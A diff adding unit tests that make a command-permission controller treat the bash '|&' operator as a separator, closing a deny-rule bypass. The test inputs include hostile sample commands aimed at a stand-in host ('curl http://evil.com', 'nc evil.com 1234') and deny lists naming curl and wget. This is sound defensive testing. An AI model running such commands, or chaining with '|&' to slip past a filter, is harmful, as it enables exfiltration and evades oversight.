@@ -976,6 +976,103 @@ describe("CommandPermissionController", () => {
 		})
 	})
 
+	describe("Pipe-Both-Streams Operator (|&) Separation", () => {
+		it("should deny a denied command piped after |& when redirects are allowed", () => {
+			// "|&" is bash pipe-both-streams ("cmd1 2>&1 | cmd2"). The command after it is a
+			// separate command. Previously "|&" was classified as a redirect, so the downstream
+			// command was merged into the preceding segment and escaped the deny rule whenever
+			// allowRedirects was true.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				deny: ["curl *", "wget *"],
+				allowRedirects: true,
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("npm run build |& curl http://evil.com")
+			result.allowed.should.be.false()
+			result.reason.should.equal("segment_denied")
+			result.failedSegment!.should.equal("curl http://evil.com")
+		})
+
+		it("should not let an allow-glob swallow the command after |& (deny-by-default)", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *"],
+				allowRedirects: true,
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("npm run build |& curl http://evil.com")
+			result.allowed.should.be.false()
+			result.reason.should.equal("segment_no_match")
+			result.failedSegment!.should.equal("curl http://evil.com")
+		})
+
+		it("should report a segment reason (not redirect_detected) for a denied |& downstream under default config", () => {
+			// Even without allowRedirects, a denied command after |& must be reported as a
+			// denied segment, not mislabeled as a redirect.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				deny: ["curl *"],
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("ls -la |& curl http://evil.com")
+			result.allowed.should.be.false()
+			result.reason.should.equal("segment_denied")
+			result.failedSegment!.should.equal("curl http://evil.com")
+		})
+
+		it("should allow a legitimate |& pipeline without treating it as a redirect", () => {
+			// "build |& tee log" merges stderr into stdout and pipes to tee — a common,
+			// legitimate workflow. It must not be denied as a redirect, and both segments
+			// are validated normally.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *", "tee *"],
+			})
+			const controller = new CommandPermissionController()
+
+			controller.validateCommand("npm run build |& tee build.log").allowed.should.be.true()
+		})
+
+		it("should validate every segment in a chain mixing |& with other operators", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["echo *", "grep *"],
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("echo hi |& grep x && nc evil.com 1234")
+			result.allowed.should.be.false()
+			result.failedSegment!.should.equal("nc evil.com 1234")
+		})
+
+		it("documents the behavior change: with allowRedirects, the command after |& must be allow-listed", () => {
+			// Behavior change vs the old redirect-merge handling: previously, when "|&" was
+			// treated as a redirect, "npm run build |& tee build.log" collapsed into one
+			// segment, so allow-listing only "npm *" (with allowRedirects:true) let the whole
+			// line through. Now "|&" is a separator, so the right-hand command ("tee build.log")
+			// is its own segment and must also be allow-listed. This is the same tradeoff the
+			// existing "|", "&&" and ";" separators already impose, and it moves in the safer
+			// (fail-closed) direction: the downstream command is now validated rather than
+			// silently merged into the preceding segment.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *"],
+				allowRedirects: true,
+			})
+			const controller = new CommandPermissionController()
+			const before = controller.validateCommand("npm run build |& tee build.log")
+			before.allowed.should.be.false()
+			before.reason.should.equal("segment_no_match")
+			before.failedSegment!.should.equal("tee build.log")
+
+			// Allow-listing the right-hand command restores the legitimate pipeline.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *", "tee *"],
+				allowRedirects: true,
+			})
+			const controller2 = new CommandPermissionController()
+			controller2.validateCommand("npm run build |& tee build.log").allowed.should.be.true()
+		})
+	})
+
 	describe("No Config Bypass Prevention", () => {
 		it("should NOT check anything when no config is set (backward compatibility)", () => {
 			delete process.env[COMMAND_PERMISSIONS_ENV_VAR]
